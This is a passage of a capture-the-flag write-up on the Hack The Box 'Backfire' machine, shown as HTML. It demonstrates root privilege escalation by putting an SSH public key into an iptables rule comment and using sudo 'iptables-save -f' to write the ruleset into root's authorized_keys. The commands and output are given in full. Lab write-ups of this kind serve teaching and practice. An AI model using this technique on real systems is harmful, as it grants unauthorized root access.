+<span class="gp">sergej@backfire:/$</span><span class="w"> </span><span class="nb">sudo </span>iptables-save                                           
+<span class="c"># Generated by iptables-save v1.8.9 (nf_tables) on Fri Jan 24 16:42:32 2025
+</span><span class="go">*filter
+:INPUT ACCEPT [130:28055]
+:FORWARD ACCEPT [0:0]
+:OUTPUT ACCEPT [174:35449]
+-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
+-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable
+-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
+-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable
+-A INPUT -i lo -m comment --comment "test"
+-A INPUT -i lo -m comment --comment "
+test
+"
+COMMIT
+</span><span class="c"># Completed on Fri Jan 24 16:42:32 2025
+</span></code></pre></div></div>
+<p>That works!</p>
+<h4 id="write-ssh-key">Write SSH Key</h4>
+<p>I’ll write my public SSH key into a comment:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sergej@backfire:/$</span><span class="w"> </span><span class="nb">sudo </span>iptables <span class="nt">-A</span> INPUT <span class="nt">-i</span> lo <span class="nt">-m</span> comment <span class="nt">--comment</span> <span class="s1">$'</span><span class="se">\n</span><span class="s1">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing</span><span class="se">\n</span><span class="s1">'</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">authorized_keys</code> files ignore lines that don’t match the required format, so as long as I get my key onto its own line, it should work:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">@backfire:/$ </span><span class="nb">sudo </span>iptables-save                
+<span class="c"># Generated by iptables-save v1.8.9 (nf_tables) on Fri Jan 24 16:43:48 2025
+</span><span class="go">*filter
+:INPUT ACCEPT [227:81030]
+:FORWARD ACCEPT [0:0]
+:OUTPUT ACCEPT [436:104924]
+-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
+-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable
+-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
+-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable
+-A INPUT -i lo -m comment --comment "\\ntest\\n"
+-A INPUT -i lo -m comment --comment "
+test
+"
+-A INPUT -i lo -m comment --comment "
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing
+"
+COMMIT
+</span><span class="c"># Completed on Fri Jan 24 16:43:48 2025
+</span></code></pre></div></div>
+<p>I’ll save that to root’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sergej@backfire:/$</span><span class="w"> </span><span class="nb">sudo </span>iptables-save <span class="nt">-f</span> /root/.ssh/authorized_keys
+</code></pre></div></div>
+<p>And connect with SSH:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen root@10.10.11.49
+<span class="go">Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
+</span><span class="gp">root@backfire:~# </span><span class="w">
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2025/06/07/htb-backfire.html"></a>
+</article>
